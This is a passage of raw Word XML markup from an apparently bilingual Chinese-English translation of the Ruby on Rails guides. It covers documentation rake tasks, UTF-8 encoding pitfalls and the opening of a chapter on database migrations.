    <w:p w14:paraId="7E41FA61" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>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The </w:t>
      </w:r>
      <w:hyperlink r:id="rId94" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Ruby on Rails guides</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="442F48EF" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>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The </w:t>
      </w:r>
      <w:hyperlink r:id="rId95" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Ruby on Rails Tutorial</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="650DCFAA" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>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The </w:t>
      </w:r>
      <w:hyperlink r:id="rId96" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Ruby on Rails mailing list</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5DE49A9A" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>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The </w:t>
      </w:r>
      <w:hyperlink r:id="rId97" w:anchor="rubyonrails" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>#rubyonrails</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> channel on irc.freenode.net</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260BEAB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Rails 同样也带有内置的帮助你可以使</w:t>
      </w:r>
      <w:r w:rsidRPr="008938C9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>用 rake 命令实用工具在你的应用程序中创建帮助文档</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3238A0D0" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>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运行 </w:t>
      </w:r>
      <w:r w:rsidRPr="008938C9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>rake doc:guides</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会</w:t>
      </w:r>
      <w:r w:rsidRPr="008938C9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>输出所有 Rails Guides</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的文档到你的应用程序中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>doc/guides</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中。在你的浏览器中打开/guides/index.html浏览 Guides。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="417E0ABA" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>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运行 </w:t>
      </w:r>
      <w:r w:rsidRPr="008938C9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>rake doc:rails</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会</w:t>
      </w:r>
      <w:r w:rsidRPr="008938C9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>输出所有Rails API</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的文档到你的应用程序中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>doc/api</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中。在你的浏览器中打开 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>doc/api/index.html</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 浏览API documentation。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B6E6022" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>17 Configuration Gotchas配置陷阱</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="746AB4AA"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 xml:space="preserve">The easiest way to work with Rails is to store all external data as UTF-8. If you don’t, Ruby libraries and Rails will often be able to convert your native data into UTF-8, but this doesn’t always work reliably, so you’re better off ensuring that all external data is UTF-8. 使用 Rails 最简单的工作方式是存储所有的外部数据为 UTF-8编码。如果不那样做，Ruby libraries 和 Rails 通才会转换你的自然数据成 UTF-8 编码，但是这样不是很可靠，因此你最好保证所有的外部数据是 UTF-8 编码。如果你在这里犯了错误，一般的症状就是在浏览器中出现钻石符号（可能是^）变成了问号。 </w:t>
      </w:r>
      <w:r w:rsidRPr="008938C9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>另一个普遍症状是 “ü” 变成了 “Ã¼”</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA1E66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Rails 在国际化上下了很多的功夫，大部分的此类错误都能够自动发现并错误，然而如果你有一些不是用 UTF-8 存储的特殊的数据恐怕就会出现一些奇怪的问题了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A11C96D" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>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两种典型的非 UTF-8 编码的源数据：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07692EAC" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>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Your text editor: Most text editors (such as Textmate), default to saving files as UTF-8. If your text editor does not, this can result in special characters that you enter in your templates (such as é) to appear as a diamond with a question mark inside in the browser. This also applies to your I18N translation files. Most editors that do not already default to UTF-8 (such as some versions of Dreamweaver) offer a way to change the default to UTF-8. Do so.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69302851" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Your database. Rails defaults to converting data from your database into UTF-8 at the boundary. However, if your database is not using UTF-8 internally, it may not be able to store all characters that your users enter. For instance, if your database is using Latin-1 internally, and your user enters a Russian, Hebrew, or Japanese character, the data will be lost forever once it enters the database. If possible, use UTF-8 as the internal storage of your database.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77878F3A" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E"/>
    <w:p w14:paraId="268EA22D" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="005D6D6E" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48F066CC" w14:textId="2DCE638F" w:rsidR="005D6D6E" w:rsidRPr="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="005D6D6E">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00CF489B">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="005D6D6E">
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>模型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A480C4" w14:textId="23A9A304" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002B5D47" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>2.1、</w:t>
      </w:r>
      <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Rails 数据库迁移</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46ECC52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数据库迁移（Migrations）提供了一些便利的方法让你有条理地修改数据库。虽然说直接 编写SQL也能修改数据库，但是这样你不但必须通知其他的开发者去执行一样的步骤，而且你 也得一直注意下次部署的时候和在正式上线的产品版服务器上面追踪并执行这些操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="045557B9"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Active Record 会自动追踪哪些 Migrations 已经执行过、哪些还没执行。所以，你只要更新 你本地的代码然后执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake db:migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，其他的就交给 Active Record ，它会自己搞懂该 跑哪些 Migrations 。还有，它也会自动更新 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>db/schema.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件，让它与修改后的数据库结构同步。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5912F7C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有了 Migrations ，你就可以用Ruby来写这些数据库变更。一件很棒的事情是 Migration 是独立 于数据库系统的（和大多数 Active Record 的功能一样），也就是说，你不用烦恼各种数据 库的语法差异，像是 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>SELECT *</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的各种写法之类的。（当然，如果要针对某个特定的数据库 系统编写特定的功能的话，你也可以直接编写原始的SQL语句）。例如，你可以在开发阶段 使用SQLite3，在正式上线阶段则使用MySQL，它会自动处理好两者间的语法细节。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B931A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在这个指南中，你将会了解到：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B31775" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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用于创建migration的生成器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F97AF08" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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Active Record 所提供用于操纵数据库的方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3922A358" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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用于操纵migrations的Rake任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E12DDB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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Migrations跟数据库纲要文件（</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>schema.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>）的关联</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A8D797"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目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D639C11" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="008938C9" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId98" w:anchor="1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>剖析迁移任务的构造</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3166FFCF"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99" w:anchor="1-1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Migrations也是类</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5770748D"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00" w:anchor="1-2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>关于文件名</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="10342296"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01" w:anchor="1-3" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>迁移任务变更</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3B1F9468"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02" w:anchor="1-4" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>支持的数据类型</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="458D314C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="008938C9" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId103" w:anchor="2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>创建一个迁移任务</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="54A91071"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04" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>建立一个 Model</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="74E8A51A"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05" w:anchor="2-2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>建立一个独立的迁移任务</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1C12BF6C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="008938C9" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId106" w:anchor="3" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
